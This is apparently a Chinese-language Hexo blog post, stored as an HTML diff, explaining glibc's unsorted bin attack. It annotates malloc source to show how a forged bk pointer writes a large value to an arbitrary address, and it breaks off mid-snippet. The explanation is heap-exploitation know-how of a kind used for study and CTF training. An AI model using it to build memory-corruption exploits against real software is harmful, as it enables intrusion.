@@ -1,0 +1,1188 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+    
+
+<!-- keywords -->
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="John Doe">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="John Doe">
+    
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="参考链接：https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;7251  unsorted bin attackunsorted bin介绍unsorted bin attack作为一种久远的攻击方式常常作为其他攻击方式的辅助手段，比如修改global_max_fast为一个较大的值使得几乎所有大小的chunk都用fast bin的管理方式进行分配和释放，又或者修改_IO_list_all来伪造_I">
+<meta property="og:type" content="article">
+<meta property="og:title" content="unsorted bin attack">
+<meta property="og:url" content="http://example.com/2022/01/15/unsorted%20bin%20attack/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="参考链接：https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;7251  unsorted bin attackunsorted bin介绍unsorted bin attack作为一种久远的攻击方式常常作为其他攻击方式的辅助手段，比如修改global_max_fast为一个较大的值使得几乎所有大小的chunk都用fast bin的管理方式进行分配和释放，又或者修改_IO_list_all来伪造_I">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202201152243129.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202201152243130.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202201152243131.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202201152243132.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202201152243133.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202201152243134.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202201152243135.png">
+<meta property="article:published_time" content="2022-01-15T14:41:57.326Z">
+<meta property="article:modified_time" content="2022-01-15T14:45:06.121Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202201152243129.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    
+    <title>unsorted bin attack · 渐渐的博客</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20210823" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="/css/dark.css?v=20210823" as="style">
+    <link rel="stylesheet" href="/css/dark.css" media="(prefers-color-scheme: dark)">
+    <link rel="stylesheet" href="/css/mobile.css?v=20210823" media="(max-width: 960px)">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js?v=20210823" as="script">
+    <link rel="preload" href="/scripts/dark.js?v=20210823" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+    
+        <body class="post-body">
+    
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        
+            <div class="header-sidebar-menu">
+        
+            
+                <div style="padding-left: 1px;">&#xe775;</div>
+            
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href=/>渐渐的博客</a>
+        </span>
+    </div>
+    <!-- toggle banner for post layout -->
+    
+        
+            <div class="banner">
+        
+            <div class="blog-title header-element">
+                <a href="/">渐渐的博客</a>
+            </div>
+            <div class="post-title header-element">
+                <a href="#" class="post-name">unsorted bin attack</a>
+            </div>
+        </div>
+    
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- back to top button -->
+    <div class="footer-fixed-element">
+        
+            <div class="back-top back-top-hidden">
+        
+        
+            <div>&#xe639;</div>
+        
+        </div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="
+
+
+
+
+
+
+
+    height:50vh;
+
+">
+    
+    <!-- 主页  -->
+    
+        
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/wlop1.jpeg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+                unsorted bin attack
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+                
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页 meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">2.7k</span>Reading time: <span class="post-count reading-time">12 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2022/01/15</span>
+                    <!-- busuanzi -->
+                    
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <blockquote>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7251">https://xz.aliyun.com/t/7251</a></p>
+</blockquote>
+<h2 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h2><h3 id="unsorted-bin介绍"><a href="#unsorted-bin介绍" class="headerlink" title="unsorted bin介绍"></a>unsorted bin介绍</h3><p>unsorted bin attack作为一种久远的攻击方式常常作为其他攻击方式的辅助手段，比如修改global_max_fast为一个较大的值使得几乎所有大小的chunk都用fast bin的管理方式进行分配和释放，又或者修改_IO_list_all来伪造_IO_FILE进行攻击。在上述攻击的利用过程中我们实际上并不需要对unsorted bin的分配过程有太多的了解。</p>
+<blockquote>
+<p>global_max_fast是main_arena中控制最大fastbin大小的变量。</p>
+</blockquote>
+<ol>
+<li><p><code>unsorted bin</code>也是以链表的方式进行组织的，和<code>fast bin</code>不同的是其分配方式是<code>FIFO</code>，即一个chunk放入<code>unsorted bin</code>链时将该堆块插入链表头，而从这个链取堆块的时候是从尾部开始的，因此<code>unsorted bin</code>遍历堆块的时候使用的是<code>bk</code>指针。</p>
+</li>
+<li><p>在程序malloc时，如果在fastbin，smallbin中找不到对应大小的chunk，就会尝试从unsortedbin中寻找chunk。如果取出的chunk大小刚好满足，就会直接返还给用户，否则就会把这些chunk分别插入到对应的bin中。</p>
+</li>
+</ol>
+<h3 id="unsorted-bin源码"><a href="#unsorted-bin源码" class="headerlink" title="unsorted bin源码"></a>unsorted bin源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">#源码的第<span class="number">3470</span>行<span class="number">-3597</span>行</span><br><span class="line">	  <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">		#取链表尾部的chunk记作victim</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          #倒数第二个chunk记作bck</span><br><span class="line">          #接下来对victim的size位进行检查</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line">		  #检查通过，计算victim得到实际chunk的大小</span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">              #假如说我们申请的<span class="built_in">malloc</span>大小属于smallbin的范围，并且last_remainder是</span><br><span class="line">              <span class="meta">#unsortedbin的唯一一个chunk时，优先使用这个chunk。</span></span><br><span class="line">              </span><br><span class="line">            &#123;</span><br><span class="line">              #假若满足条件则对其进行切割和解链操作</span><br><span class="line">              </span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">		  #如果上述条件不满足，则将victim从链中取出之后放到合适的链中或返回给用户。</span><br><span class="line">          #其中unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          <span class="meta">#bck-&gt;fd = unsorted_chunks (av);</span></span><br><span class="line">          #是unsorted bin attack产生的原因，</span><br><span class="line">          #一旦我们绕过之前的检查到达这里，</span><br><span class="line">          #在可以控制victim-&gt;bk即bck的情况下我们可以往bck-&gt;fd写入unsorted_chunks(av)</span><br><span class="line">          #即*(bck+<span class="number">0x10</span>)=unsorted(av)。</span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          <span class="meta">#unsortedbin产生的原因：</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line">		  #</span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line">    	  #如果我们请求的nb同victim的大小恰好吻合，就直接返回这个块给用户。</span><br><span class="line">          <span class="keyword">if</span> (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* place chunk in bin */</span></span><br><span class="line">		  #如果之前的条件都不满足，意味着目前的victim不能满足用户的需求，</span><br><span class="line">          #需要根据其size放入small bin或large bin的链，</span><br><span class="line">          #其中在后者实现中存在large bin attack，</span><br><span class="line">          #由于同本文无关就不再进一步展开，最后是unlink将victim彻底解链。</span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;size)</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">          <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="unsorted-bin-attack-1"><a href="#unsorted-bin-attack-1" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h3><ul>
+<li>Unsorted Bin Attack 被利用的前提是控制 Unsorted Bin Chunk 的 bk 指针。</li>
+<li>Unsorted Bin Attack 可以达到的效果是实现修改任意地址值为一个较大的数值，然后配合fastbin attack使用，达到任意地址写的效果。</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#如果上述条件不满足，则将victim从链中取出之后放到合适的链中或返回给用户。</span><br><span class="line"> #其中unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line"> <span class="meta">#bck-&gt;fd = unsorted_chunks (av);</span></span><br><span class="line"> #是unsorted bin attack产生的原因，</span><br><span class="line"> #一旦我们绕过之前的检查到达这里，</span><br><span class="line"> #在可以控制victim-&gt;bk即bck的情况下我们可以往bck-&gt;fd写入unsorted_chunks(av)</span><br><span class="line"> #即*(bck+<span class="number">0x10</span>)=unsorted(av)。</span><br><span class="line"> <span class="comment">/* remove from unsorted list */</span></span><br><span class="line"> <span class="meta">#unsortedbin产生的原因：</span></span><br><span class="line"> unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line"> 